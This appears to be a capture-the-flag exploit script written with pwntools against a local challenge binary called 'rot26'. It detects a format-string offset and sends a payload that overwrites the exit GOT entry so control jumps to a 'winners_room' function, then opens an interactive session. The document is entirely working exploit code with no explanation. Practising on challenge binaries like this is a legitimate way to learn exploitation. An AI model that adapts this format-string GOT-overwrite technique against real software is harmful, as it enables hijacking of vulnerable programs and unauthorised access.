#!/usr/bin/python

from pwn import *

def send_payload(payload):
	p = process('./rot26')
	log.info("payload = %s" % repr(payload))
	p.sendline(payload)
	return p.recv()

e = ELF('./rot26')
address_exit_got = e.got['exit']
address_winners_room = e.symbols['winners_room']

format_string = FmtStr(execute_fmt=send_payload)
offset = format_string.offset

p = process('./rot26')
payload = fmtstr_payload(offset, {address_exit_got: address_winners_room})
p.sendline(payload)
p.interactive()